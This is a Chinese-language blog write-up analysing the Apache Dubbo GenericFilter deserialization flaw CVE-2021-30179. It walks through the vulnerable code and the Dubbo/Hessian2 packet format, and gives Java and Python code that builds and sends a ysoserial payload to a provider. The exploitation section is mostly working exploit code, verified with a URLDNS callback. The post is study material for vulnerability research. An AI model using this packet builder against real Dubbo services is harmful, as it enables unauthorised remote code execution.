---
layout:     post
title:      "CVE-2021-30179 Dubbo GenericFilter反序列化分析"
subtitle:   ""
date:       2021-06-04 20:13:14
author:     "kuron3k0"
header-img: "img/post-bg-rwd.jpg"
tags:
    - Java
---

星球里看到threedr3am师傅发的这个漏洞，学习一下

Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

## 漏洞点

邮件里已经把漏洞点说的很明白了，Dubbo支持generic call去调用任意方法，而`GenericFilter`会处理这些调用。当调用`$invoke`或`$invokeAsync`方法时，第一个参数是要调用的方法，第二个参数是方法的参数类型，第三个参数是参数值，如果`generic`参数为`nativejava`，第三个参数是字节数组的话，Dubbo就会对字节数组进行java原生的反序列化
![](/img/in-post/CVE-2021-30179/1.png)

这是`consumer`访问`provider`时到`GenericFilter`的调用栈
```java
invoke:60, GenericFilter (org.apache.dubbo.rpc.filter)
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
handleRequest:100, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:175, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
```

定位到关键代码，当判断`generic`为`GENERIC_SERIALIZATION_NATIVE_JAVA`（即`nativejava`）时，调用java原生反序列化
```java
if (ProtocolUtils.isJavaGenericSerialization(generic)) {
    for (int i = 0; i < args.length; i++) {
        if (byte[].class == args[i].getClass()) {
            try (UnsafeByteArrayInputStream is = new UnsafeByteArrayInputStream((byte[]) args[i])) {
                args[i] = ExtensionLoader.getExtensionLoader(Serialization.class)
                .getExtension(GENERIC_SERIALIZATION_NATIVE_JAVA)
                .deserialize(null, is).readObject();
            } catch (Exception e) {
                throw new RpcException("Deserialize argument [" + (i + 1) + "] failed.", e);
            }
        } else {
            throw new RpcException();
            ......  

```

## 漏洞利用

这里我直接用了Dubbo的demo provider和consumer，但是有个很坑的地方就是，provider必须把对nativejava序列化的模块加进依赖，不然会找不到处理字节码的模块，demo里的provider是没有的。。
```xml
<dependency>
    <groupId>org.apache.dubbo</groupId>
    <artifactId>dubbo-serialization-jdk</artifactId>
</dependency>
```

把$invoke的参数换成URLDNS的payload，运行consumer
```java
        ReferenceConfig<GenericService> reference = new ReferenceConfig<GenericService>();
        reference.setInterface(DemoService.class);
        reference.setUrl("dubbo://127.0.0.1:20880/org.apache.dubbo.demo.DemoService?application=generic-test&generic=nativejava&interface=org.apache.dubbo.demo.DemoService&register.ip=xx.xx.xx.xx&remote.application=&scope=remote&side=consumer&sticky=false&timeout=3000000");
        // 设置nativejava
        reference.setGeneric(GENERIC_SERIALIZATION_NATIVE_JAVA);

        DubboBootstrap bootstrap = DubboBootstrap.getInstance()
                .application(new ApplicationConfig("generic-test"))
                .registry(new RegistryConfig("N/A"))
                .protocol(new ProtocolConfig("dubbo", 20880))
                .reference(reference)
                .start();

        DemoService demoService = (DemoService)ReferenceConfigCache.getCache().get(reference);
        byte[] b = null;
        try {
             b = getContent("D:\\渗透\\ysoserial\\target\\urldns_exp");
        }catch(Exception e){
            e.printStackTrace();
        }
        // generic invoke
        GenericService genericService = (GenericService) demoService;
        Object genericInvokeResult = genericService.$invoke("sayHello", new String[] { String.class.getName() },
                new Object[] { b });

```

抓包看了下，看到开头的`dabb`就知道是Dubbo协议了，直接发到provider的端口
![](/img/in-post/CVE-2021-30179/2.png)

研究下Dubbo的协议格式好自己构造数据包，这是在官网找到header的结构

|偏移量(Bit)   |	字段|	取值|
|----|----|----|
|0 ~ 7|	魔数高位|	0xda00|
|8 ~ 15|	魔数低位|	0xbb|
|16	|数据包类型|	0 - Response, 1 - Request|
|17	|调用方式|	仅在第16位被设为1的情况下有效，0 - 单向调用，1 - 双向调用|
|18	|事件标识|	0 - 当前数据包是请求或响应包，1 - 当前数据包是心跳包|
|19 ~ 23|	序列化器编号|	2 - Hessian2Serialization <br>3 - JavaSerialization<br>4 - CompactedJavaSerialization<br>6 - FastJsonSerialization<br>7 - NativeJavaSerialization<br>8 - KryoSerialization<br>9 - FstSerialization|
|24 ~ 31|	状态|	20 - OK<br>30 - CLIENT_TIMEOUT<br>31 - SERVER_TIMEOUT<br>40 - BAD_REQUEST<br>50 - BAD_RESPONSE|
|32 ~ 95|	请求编号|	共8字节，运行时生成|
|96 ~ 127|	消息体长度|	运行时计算|

这个跟我们的报文没什么关系，按抓包默认的设置就好，长度按照最终body算即可，可以跟抓到的包对应上

```java
\xda\xbb   							魔数 
\xc2       							11000010，序列化器为2，即Hessian2Serialization       
\x00       							status
\x00\x00\x00\x00\x00\x00\x00\x00    id
\x00\x00\x02j       				len
```

后面就是各个字段的Hessian2反序列化，从Dubbo的编码代码可以看出来各字段的顺序

```java
protected void encodeRequestData(Channel channel, ObjectOutput out, Object data, String version) throws IOException {
        RpcInvocation inv = (RpcInvocation) data;
		/*
		Hessian2序列化顺序：
			1.dubboVersion
			2.path
			3.version
			4.methodName
			5.methodDesc
			6.paramsObject
			7.map
		*/

        out.writeUTF(version);
        // https://github.com/apache/dubbo/issues/6138
        String serviceName = inv.getAttachment(INTERFACE_KEY);
        if (serviceName == null) {
            serviceName = inv.getAttachment(PATH_KEY);
        }
        out.writeUTF(serviceName);
        out.writeUTF(inv.getAttachment(VERSION_KEY));

        out.writeUTF(inv.getMethodName());
        out.writeUTF(inv.getParameterTypesDesc());
        Object[] args = inv.getArguments();
        if (args != null) {
            for (int i = 0; i < args.length; i++) {
                out.writeObject(encodeInvocationArgument(channel, inv, i));
            }
        }
        out.writeAttachments(inv.getObjectAttachments());
    }
```

根据Hessian2的序列化方式封装函数，注意序列化字符串和byte数组的时候根据长度不同会有不同的写法，按照源码改写就可以了

```python
def hex_pad(length): 
    tmp = hex(length)[2:]
    if len(tmp) % 2:
        return '0'+tmp
    else:
        return tmp
        
def hessian2_writeString(s):
    l = len(s)
    if l <= 31:      
        return bytes.fromhex(hex_pad(l))+s.encode()
    elif l <= 1023:
        return bytes.fromhex(hex_pad((l >> 8 )+ 48)) + bytes.fromhex(hex_pad(l & 0xff)) + s.encode()
    else:
        return b'S' + bytes.fromhex(hex_pad(l >> 8 )) + bytes.fromhex(hex_pad(l & 0xff)) + s.encode()
        
def hessian2_writeBytes(obj):
    if type(obj) is not bytes:
        return
    l = len(obj)
    if l <= 15:      
        return bytes.fromhex(hex_pad(l + 32))+obj
    elif l <= 1023:
        return bytes.fromhex(hex_pad((l >> 8 )+ 52)) + bytes.fromhex(hex_pad(l & 0xff)) + obj
    else:
        return b'B' + bytes.fromhex(hex_pad(l >> 8 )) + bytes.fromhex(hex_pad(l & 0xff)) + obj
```

封装数据包

```python
# body
body = hessian2_writeString('2.0.2')
body += hessian2_writeString(service_name)
body += hessian2_writeString('0.0.0')
body += hessian2_writeString('$invoke')
body += hessian2_writeString('Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;')
body += hessian2_writeString(func_name)
body += b'q'                                        # length of array, number of arguments + 'p' 
body += hessian2_writeString('[string')             # array type
body += hessian2_writeString(parameter_desc)        # argument type
body += b'q'                                        # length of array, number of arguments + 'p' 
body += hessian2_writeString('[object')             # array type
body += hessian2_writeBytes(yso_payload)            # serialized data

# config map
body += b'H'
body += hessian2_writeString('path')
body += hessian2_writeString(service_name)
body += hessian2_writeString('remote.application')
body += hessian2_writeString('generic-test')
body += hessian2_writeString('interface')
body += hessian2_writeString(service_name)
body += hessian2_writeString('version')
body += hessian2_writeString('0.0.0')
body += hessian2_writeString('generic')
body += hessian2_writeString('nativejava')
body += b'Z'
```

对应的服务名和参数描述可以通过telnet到provider端口上去获取
![](/img/in-post/CVE-2021-30179/3.png)

ls命令获取服务信息
![](/img/in-post/CVE-2021-30179/4.png)

执行exp
![](/img/in-post/CVE-2021-30179/5.png)

dnslog拿到数据，反序列化成功
![](/img/in-post/CVE-2021-30179/6.png)

